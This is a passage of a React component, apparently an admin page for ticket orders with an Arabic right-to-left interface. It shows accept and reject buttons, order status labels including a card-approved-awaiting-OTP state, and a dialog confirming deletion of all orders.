                        className="flex-1 flex items-center justify-center gap-1.5 py-2.5 rounded-xl bg-gradient-to-r from-red-500 to-rose-500 text-white text-[12px] font-bold shadow-md shadow-red-500/20 hover:shadow-lg hover:shadow-red-500/30 transition-all active:scale-[0.98]"
                      >
                        <XCircle className="w-4 h-4" />
                        رفض
                      </button>
                    </div>
                  ) : (
                    <div className={`flex items-center justify-center gap-2 py-2.5 rounded-xl text-[12px] font-bold ${st.bg} ${st.text}`}>
                      <StIcon className="w-4 h-4" />
                      {o.status === "confirmed" ? "تم القبول"
                       : o.status === "approved_card" ? "تمت موافقة البطاقة — بانتظار OTP"
                       : "تم الرفض"}
                    </div>
                  )}
                </div>
              </div>
            );
          })
        )}
      </div>

      <AlertDialog open={showClearAll} onOpenChange={setShowClearAll}>
        <AlertDialogContent dir="rtl">
          <AlertDialogHeader>
            <AlertDialogTitle>مسح جميع الطلبات</AlertDialogTitle>
            <AlertDialogDescription>
              هل أنت متأكد من مسح جميع طلبات التذاكر؟ سيتم حذف {orders.length} طلب نهائياً ولا يمكن التراجع عن هذا الإجراء.
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter className="flex-row-reverse gap-2">
            <AlertDialogCancel>إلغاء</AlertDialogCancel>
            <AlertDialogAction onClick={clearAllOrders} className="bg-red-500 hover:bg-red-600">
              مسح الكل
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>
    </div>
  );
};

export default AdminOrders;
